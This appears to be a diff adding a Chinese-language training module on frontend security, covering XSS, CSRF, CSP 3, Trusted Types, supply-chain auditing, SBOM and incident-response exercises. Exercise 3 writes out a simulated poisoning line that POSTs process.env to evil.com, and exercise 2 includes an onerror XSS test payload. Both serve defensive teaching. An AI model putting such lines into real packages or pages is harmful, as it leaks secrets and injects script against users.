@@ -1,0 +1,137 @@
+learning_targets:
+- 理解前端安全体系的纵深防御思想，掌握 XSS、CSRF 等经典攻击的成因与防御矩阵
+- 熟练配置 CSP 3 策略，掌握 nonce、hash、strict-dynamic 等指令实现脚本执行的精准授权
+- 掌握 Trusted Types API 原理与落地，从根源上杜绝 DOM 型 XSS 注入风险
+- 建立供应链安全意识，掌握依赖审计、锁文件管理、SBOM 生成与恶意包检测的工程化流程
+- 具备制定前端安全基线清单与应急响应 SOP 的能力，接入 SDL 安全开发生命周期
+concept_map:
+- 前端安全体系构建
+- ├── XSS 攻防全景
+- │   ├── 攻击分型：存储型/反射型/DOM-based  —— P001
+- │   ├── 编码上下文：HTML/Attribute/JS/URL/CSS 五大场景  —— P001
+- │   ├── 防御手段：DOMPurify 白名单清洗  —— P001
+- │   └── 终极防御：Trusted Types 强制安全类型赋值  —— P001
+- ├── CSRF 与 SameSite Cookie
+- │   ├── 攻击链路演示与同源策略演进  —— P002
+- │   ├── SameSite=Lax/Strict/None 实战拦截效果  —— P002
+- │   └── 双重提交令牌模式（Header/表单）  —— P002
+- ├── 内容安全策略 (CSP 3)
+- │   ├── 核心指令：script-src 'nonce-xxx' 'strict-dynamic'  —— P003
+- │   ├── 部署策略：report-uri 违规上报、Report-Only 灰度  —— P003
+- │   └── 兼容性：哈希值兜底、内联脚本治理  —— P003
+- ├── 供应链安全
+- │   ├── 依赖审计：npm audit/pnpm audit/Snyk/Socket CI 接入  —— P004
+- │   ├── 完整性保障：package-lock.json 版本锁定  —— P004
+- │   └── 合规交付：CycloneDX SBOM 生成  —— P004
+- └── 安全工程化落地
+- '    ├── 基线清单：《前端安全开发规范》《安全编码 Checklist》  —— P005'
+- '    ├── 应急响应：漏洞分级与响应流程 SOP  —— P005'
+- '    └── SDL 集成：安全开发生命周期闭环  —— P005'
+life_analogy:
+- 想象前端应用是一座**高安保级别的智能大厦**：
+- '- **XSS 攻击** = 伪装成访客的间谍，混入恶意指令单（脚本）诱导前台（浏览器）执行违规操作：'
+- '  - **编码上下文** = 不同区域的安检规则（大厅/电梯/机房需不同证件）'
+- '  - **DOMPurify** = 入口安检机，按白名单清洗携带物品'
+- '  - **Trusted Types** = 强制实名制通行证系统，无证件（可信类型）寸步难行'
+- '- **CSRF 攻击** = 偷走员工工牌（Cookie）冒充身份刷门禁：'
+- '  - **SameSite Cookie** = 工牌加装‘仅限本人持用’芯片（Lax/Strict），跨楼宇自动失效'
+- '  - **双重提交令牌** = 刷工牌同时需验证动态验证码（Header Token）'
+- '- **CSP 策略** = 大厦总控系统发布的‘准入白名单’：'
+- '  - **nonce/hash** = 单次有效的电子通行码 / 人脸识别特征码'
+- '  - **strict-dynamic** = 信任链传递：受信系统（脚本）引入的子系统自动受信'
+- '  - **Report-Only** = 先发‘预警模式’观察误拦情况，再正式执法'
+- '- **供应链安全** = 装修材料（依赖包）供应商资质审核体系：'
+- '  - **依赖审计/锁文件** = 严查材料产地、锁定批次防止偷梁换柱'
+- '  - **SBOM** = 出具完整‘材料成分表’备查'
+- '- **安全基线与 SOP** = 大厦的《消防条例》与《应急预案》：'
+- '  - **Checklist** = 日常巡检清单'
+- '  - **SDL** = 从设计、施工、验收到运维的全生命周期安全规范'
+summary:
+- concept: XSS (跨站脚本攻击)
+  desc: 通过注入恶意脚本窃取数据或劫持会话，分为存储型、反射型、DOM-based 三类
+- concept: 五大编码上下文
+  desc: HTML/Attribute/JS/URL/CSS 五种输出场景需对应专用编码函数，混用会导致防御失效
+- concept: DOMPurify
+  desc: 成熟的 HTML 白名单清洗库，配置策略可安全处理富文本内容
+- concept: Trusted Types
+  desc: 浏览器原生 API，强制敏感接口（如 innerHTML）仅接受可信类型对象，从根源消灭 DOM XSS
+- concept: CSRF (跨站请求伪造)
+  desc: 利用用户已登录态发起非自愿请求，核心防御是 SameSite Cookie 与双重提交令牌
+- concept: SameSite 属性
+  desc: Lax 允许链接跳转携带，Strict 完全禁止跨站携带，None 需配合 Secure 用于跨域场景
+- concept: CSP 3 (内容安全策略)
+  desc: 声明式告知浏览器可加载/执行的资源白名单，核心指令 script-src 配合 nonce/hash/strict-dynamic
+- concept: nonce (一次性数字)
+  desc: 每次响应生成的随机值，内联脚本需携带匹配 nonce 才能执行，防止注入脚本执行
+- concept: strict-dynamic
+  desc: 信任链传递机制：受信脚本动态创建的子脚本自动获得信任，简化复杂应用部署
+- concept: Report-Only 模式
+  desc: CSP 策略仅上报违规不拦截，用于灰度验证策略正确性，避免误伤业务
+- concept: 供应链攻击
+  desc: 通过污染上游依赖包（事件流、恶意维护者）植入后门，影响范围极广
+- concept: 依赖审计工具链
+  desc: npm audit/pnpm audit/Snyk/Socket 集成 CI，自动拦截高危漏洞依赖
+- concept: Lockfile 完整性
+  desc: package-lock.json/pnpm-lock.yaml 锁定确切版本与完整性哈希，防止篡改与幽灵依赖
+- concept: SBOM (软件物料清单)
+  desc: CycloneDX/SPDX 格式记录所有传递依赖，满足合规审计与漏洞溯源需求
+- concept: 安全基线清单
+  desc: 固化最佳实践为强制规范：CSP 强制、Trusted Types 开启、依赖扫描门禁、敏感信息扫描
+- concept: 应急响应 SOP
+  desc: 分级分类处置流程：确认->阻断->溯源->修复->复盘，接入 SDL 实现安全左移
+exercises:
+- 'no': 1
+  title: CSP 策略调试与绕过实战
+  contents:
+  - 给定一个包含内联脚本、外部 CDN 脚本、eval 动态执行、Webpack 内联 runtime 的典型 SPA 页面：
+  - 1. 编写初版 CSP 策略（Report-Only 模式），允许业务正常运行且无违规上报
+  - 2. 尝试移除 'unsafe-inline'，使用 nonce 重构内联脚本，观察 Webpack runtime 是否兼容
+  - 3. 引入 'strict-dynamic' 替代域名白名单，验证动态加载的第三方统计脚本是否受信
+  - 4. 故意注入一个恶意内联脚本，验证其被拦截并上报
+  - 回答问题：
+  - '- 为什么 ''strict-dynamic'' 会忽略后续的域名白名单？'
+  - '- nonce 方案在 SSR 场景下如何保证每次渲染生成新值？'
+  - '- 如果必须使用 eval（如某些模板引擎），如何在 CSP 中最小化授权？'
+- 'no': 2
+  title: Trusted Types 策略编写与 Hook 改造
+  contents:
+  - 在一个使用 innerHTML 渲染富文本、使用 DOMParser 解析 HTML、使用第三方编辑器（如 Quill）的项目中：
+  - '1. 开启 `trustedTypes: ''allow-duplicates''` 创建默认策略 `default`，实现 `createHTML` 钩子调用
+    DOMPurify.sanitize'
+  - 2. 为第三方编辑器创建专用策略 `quill`，仅允许其特定的 class/属性白名单
+  - 3. 尝试在控制台直接执行 `document.body.innerHTML = '<img src=x onerror=alert(1)>'` 验证拦截效果
+  - 4. 处理 `DOMParser.parseFromString` 返回的 DocumentFragment 需再次赋值时的类型转换问题
+  - 回答问题：
+  - '- Trusted Types 如何防御 `location.href = ''javascript:...''` 这类 URL 上下文注入？'
+  - '- 如果第三方库内部直接操作 `innerHTML` 且无法修改源码，如何通过 `trustedTypes.createPolicy` 配合 Monkey
+    Patching 解决？'
+  - '- ''allow-duplicates'' 参数的作用是什么？生产环境建议开启吗？'
+- 'no': 3
+  title: 供应链攻击模拟与 CI 门禁搭建
+  contents:
+  - 模拟一次供应链投毒事件：某热门工具包 `useful-helpers` v2.3.4 被植入窃取环境变量代码：
+  - '1. 在本地 `node_modules` 手动篡改该包 `index.js` 注入 `fetch(''https://evil.com'', {method:''POST'',
+    body: JSON.stringify(process.env)})`'
+  - 2. 运行 `npm audit` / `pnpm audit` / `snyk test` 对比三者检出能力差异
+  - 3. 配置 GitHub Actions 工作流：依赖安装后自动执行审计，高危漏洞阻断流水线（`--audit-level=high`）
+  - 4. 生成 CycloneDX 格式 SBOM（`@cyclonedx/bom`），上传至 GitHub Dependency Graph 或内部制品库
+  - 5. 编写 `package.json` 的 `overrides`/`pnpm.overrides` 字段强制降级该包至安全版本，验证 `lockfile`
+    变更
+  - 回答问题：
+  - '- `npm audit` 无法检出恶意代码（而非已知 CVE）时，如何通过 Socket / Socket CLI 发现异常行为（如网络请求、读取敏感文件）？'
+  - '- Lockfile 完整性校验（`npm ci` / `pnpm install --frozen-lockfile`）如何防止 CI 环境被投毒？'
+  - '- 如何在 Monorepo 中为不同 workspace 配置差异化的审计阈值与 SBOM 生成策略？'
+- 'no': 4
+  title: 安全基线清单落地与应急演练
+  contents:
+  - 针对团队现有前端项目，执行一次完整的安全基线对标与应急响应桌面推演：
+  - 1. **基线自检**：逐项核对《前端安全开发规范》清单（CSP、TT、HTTPS、Cookie 安全属性、依赖扫描、敏感信息泄露、Source Map 上传控制等），产出《合规差距分析报告》
+  - 2. **规范固化**：将检查项转化为 ESLint 插件规则（如 `eslint-plugin-security`、`@typescript-eslint/no-floating-promises`）、Commit
+    Hook（`commitlint` 禁止提交含密钥文件）、CI 门禁（构建失败阻断）
+  - 3. **应急演练场景**：假设线上收到安全研究员报告：某页面存在存储型 XSS，攻击者可窃取管理员 Cookie 劫持后台：
+  - '   - 按 SOP 完成：漏洞确认分级（P0） -> 紧急下线/配置 WAF 阻断 -> 代码定位修复 -> 灰度验证 -> 全量发布 -> 复盘归档'
+  - '   - 产出《安全事件复盘报告》，包含根因分析（5 Why）、修复验证用例、防止复发措施（如新增 CSP/TT 规则、新增代码审查检查项）'
+  - 回答问题：
+  - '- 如何在不暴露漏洞细节的前提下，通过 GitHub Security Advisories / 内部平台完成负责任披露流程？'
+  - '- 应急演练中发现的‘盲区’（如 Source Map 泄露导致源码重构、日志脱敏不全）如何纳入下一版基线清单？'
+  - '- 如何量化安全投入产出比（ROI）：如阻断漏洞数、平均修复时间（MTTR）、安全培训覆盖率等指标纳入团队 OKR？'
